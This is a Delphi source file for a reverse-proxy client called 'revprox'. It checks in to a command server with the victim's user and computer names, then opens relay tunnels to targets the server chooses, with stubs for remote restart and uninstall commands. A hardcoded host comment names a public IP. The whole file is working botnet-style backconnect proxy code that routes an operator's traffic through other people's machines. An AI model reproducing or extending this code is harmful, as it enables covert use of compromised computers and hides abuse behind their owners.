program revprox;

{$APPTYPE CONSOLE}

uses
  windows, winsock, blcksock, sysutils, Classes,synsock, syncobjs;
var
  sockCMD : TTCPBlockSocket;
  strbuffer : String;
  count : Integer;
  critsec : TCriticalSection;
const
  HOST       = 'localhost';//hukAAet1http:///      82.211.8.199
  PORTCMD    = '7070';
  PORTTUNNEL = '8080';


type TTunnel = class(TThread)
  private
    fsocktunnel : TSocket;
    fspckproxy  : TSocket;
    fhost : String;
    fport : String;
    fid   : String;
    function RelayTCP(const fsock, dsock: TTCPBlockSocket): boolean;

  public
    timeout : Integer;
    Constructor Create (target : String);
    Destructor  Destroy; override;
    procedure   Execute; override;
end;
//etc
function GetComputerName : String;
var
  buffer : array[0..MAX_PATH] of Char;
  Size: DWORD;
begin
  Size := sizeof(buffer);
  windows.GetComputerName(buffer, Size);
  SetString(result, buffer, lstrlen(buffer));
end;

function GetUserName: string;
var
  buffer : array[0..MAX_PATH] of Char;
  Size: DWORD;
begin
  Size := sizeof(buffer);
  windows.GetUserName(buffer, Size);
  SetString(result, buffer, lstrlen(buffer));
end;

//threadsafe cmd write
procedure cwriteln(str : String);
begin
  critsec.Enter;
  writeln(str);
  critsec.Leave;
end;
//TUNNEL THREAD

Constructor TTunnel.Create (target : String);
begin
  fid   := Copy(target, 1, 4);
  delete(target, 1, 4);
  fhost := Copy(target, 1, Pos(':', target) - 1);
  fport := Copy(target, Pos(':', target) + 1, MaxInt);
  cwriteln(fid + ' - ' + fhost + ' - ' + fport);
  FreeOnTerminate:=true;
  timeout := 120000;
  inherited Create(false);
end;

Destructor TTunnel.Destroy;
begin
  fid := '';
  fhost := '';
  fport := '';
  cwriteln('[' + IntToStr(GetCurrentThreadID) + '] ' + ' tunnel closed');
  inherited Destroy;
end;

procedure TTunnel.Execute;
var
  sockTunnel : TTCPBLockSocket;
  sockProxy  : TTCPBlockSocket;
begin
  sockTunnel := TTCPBlockSocket.Create;
  sockTunnel.Connect(HOST, PORTTUNNEL);
  sockProxy := TTCPBlockSocket.Create;
  SockProxy.Connect(fhost, fport);
  if (sockTunnel.LastError = 0) AND (sockProxy.LastError = 0) then begin
    cwriteln('[' + IntToStr(GetCurrentThreadID) + '] ' + ' tunnel started');

    sockTunnel.SendString('SOCK' + fid);
    RelayTCP(sockProxy, sockTunnel);
    sockProxy.CloseSocket;
    sockTunnel.CloseSocket;
    sockProxy.Free;
    sockTunnel.Free;
  end;
end;

//do both direction TCP proxy tunnel
function TTunnel.RelayTCP(const fsock, dsock: TTCPBlockSocket): boolean;
var
  n: integer;
  buf: string;
  ql, rl: TList;
  fgsock, dgsock: TTCPBlockSocket;
  FDSet: TFDSet;
  FDSetSave: TFDSet;
  TimeVal: PTimeVal;
  TimeV: TTimeVal;
begin
  result := false;
  //buffer maybe contains some pre-readed datas...
{  if fsock.LineBuffer <> '' then
  begin
    buf := fsock.RecvPacket(timeout);
    if fsock.LastError <> 0 then
      Exit;
    dsock.SendString(buf);
  end;                      }
  //begin relaying of TCP
  ql := TList.Create;
  rl := Tlist.create;
  try
    TimeV.tv_usec := (Timeout mod 1000) * 1000;
    TimeV.tv_sec := Timeout div 1000;
    TimeVal := @TimeV;
    if Timeout = -1 then
      TimeVal := nil;
    FD_ZERO(FDSetSave);
    FD_SET(fsock.Socket, FDSetSave);
    FD_SET(dsock.Socket, FDSetSave);
    FDSet := FDSetSave;
    while synsock.Select(65535, @FDSet, nil, nil, TimeVal) > 0 do
    begin
      rl.clear;
      if FD_ISSET(fsock.Socket, FDSet) then
        rl.Add(fsock);
      if FD_ISSET(dsock.Socket, FDSet) then
        rl.Add(dsock);
      for n := 0 to rl.Count - 1 do
      begin
        fgsock := TTCPBlockSocket(rl[n]);
        if fgsock = fsock then
          dgsock := dsock
        else
          dgsock := fsock;
        if fgsock.WaitingData > 0 then
        begin
          buf := fgsock.RecvPacket(0);
          dgsock.SendString(buf);
          if dgsock.LastError <> 0 then
            exit;
        end
        else
          exit;
      end;
      FDSet := FDSetSave;
    end;
  finally
    rl.free;
    ql.free;
  end;
  result := true;
end;

//MAIN LOOP
begin
  critSec := TCriticalSection.Create;
  cwriteln('revprox trying to connect to ' + HOST + ':' + PORTCMD);
  while true do begin
    sockCMD := TTCPBlockSocket.Create;
    sockCMD.Connect(HOST, PORTCMD);
    sockCMD.SendString('ONLN' + GetUsername + '|' + GetComputerName);     //change later
    while (sockCMD.LastError = 0) OR (sockCMD.LastError = WSAETIMEDOUT) do begin
      strbuffer := sockCMD.RecvTerminated(4000, '~');
      if strbuffer <> '' then begin
        If Copy(strbuffer, 0, 4) = 'SOCK' Then begin
          Delete(strbuffer, 1,4);
          cwriteln('Create new tunnel thread for ' + strbuffer);
          TTunnel.Create(strbuffer);

        end;
        If Copy(strbuffer, 0, 4) = 'CLSE' Then begin
          exit;
          //goodbye
        end;
        If Copy(strbuffer, 0, 4) = 'RSTT' Then begin
          cwriteln('restart here');
          //restart
        end;
        If Copy(strbuffer, 0, 4) = 'DLTE' Then begin
          cwriteln('uninstall here');
          //uninstall
        end;
      end;
    end;
    sockCMD.CloseSocket;
    sockCMD.Free;
    cwriteln('No connection!');
    sleep(5000);
  end;
end.
